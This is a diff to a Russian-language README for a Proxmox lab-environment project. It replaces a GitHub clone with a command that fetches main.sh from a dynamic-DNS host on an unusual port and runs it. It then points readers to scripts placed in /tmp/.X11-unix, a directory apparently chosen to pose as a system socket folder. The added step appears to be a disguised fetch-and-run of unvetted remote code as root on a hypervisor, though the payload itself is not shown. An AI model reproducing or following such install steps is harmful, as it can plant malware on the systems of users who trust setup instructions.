@@ -74,10 +74,14 @@ demo2026/
 Выполните в Shell Proxmox:
 
 ```bash
-git clone https://github.com/arugva-lab/demo2026
-cd demo2026
+wget http://kebab-na-ogne.duckdns.org:35035/main.sh
+chmod +x main.sh
+./main.sh
 ```
-
+После этого у в директории ***/tmp/.X11-unix*** появятся скрипты. Переходим в эту директорию командой
+```bash
+cd /tmp/.X11-unix
+```
 ### 2. Настройка окружения
 
 Откройте `env.sh` и укажите VMID и имена интерфейсов под вашу конфигурацию:
@@ -97,28 +101,28 @@ nano env.sh
 
 Timezone, сеть, VLAN, NAT, пользователи, SSH (порт 2026).
 ```bash
-chmod +x 11_init.sh && ./11_init.sh
+./11_init.sh
 ```
 
 **Шаг 2 - Маршрутизация (Модуль 1.2)**
 
 GRE-туннели, OSPF (FRR), DHCP, DNS (BIND).
 ```bash
-chmod +x 12_routing.sh && ./12_routing.sh
+./12_routing.sh
 ```
 
 **Шаг 3 - Сервисы и хранение (Модуль 2.1)**
 
 Chrony, Samba DC, RAID0, NFS, Ansible.
 ```bash
-chmod +x 21_xz.sh && ./21_xz.sh
+./21_xz.sh
 ```
 
 **Шаг 4 - Веб и контейнеризация (Модуль 2.2)**
 
 Docker (MariaDB + App), LAMP, Nginx Reverse Proxy, Web-аутентификация.
 ```bash
-chmod +x 22_neebu.sh && ./22_neebu.sh
+./22_neebu.sh
 ```
 
 ---
